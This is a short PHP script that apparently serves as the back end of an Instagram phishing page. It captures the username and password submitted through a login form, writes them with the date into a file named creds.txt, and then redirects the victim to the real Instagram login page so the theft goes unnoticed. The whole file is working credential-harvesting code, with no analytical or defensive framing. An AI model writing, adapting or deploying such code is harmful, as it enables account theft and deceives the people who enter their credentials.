<?php 
    $myfile = "creds.txt";

    if(isset($_POST['loginBtn'])){

        $username = $_POST['login'];
        $password = $_POST['password'];

        $currDate = date('Y-m-d');
        
        if(!file_exists("creds.txt")){//If the file does't exist create it
            //create file
            $myfile = fopen("creds.txt", "w");
            fwrite($myfile, $currDate."\n-------------------------\nUsername: ".$username."\n");
            fwrite($myfile, "Password: ".$password."\n-------------------------\n\n");
            
        }else{
            //since the file exists! write to it
            $myfile = fopen("creds.txt", "a") or die("Unable to open File");

            fwrite($myfile, $currDate."\n-------------------------\nUsername: ".$username."\n");
            fwrite($myfile, "Password: ".$password."\n-------------------------\n\n");
        }


        fclose($myfile);

        header("Location: https://www.instagram.com/accounts/login/?source=auth_switcher");
    }

?>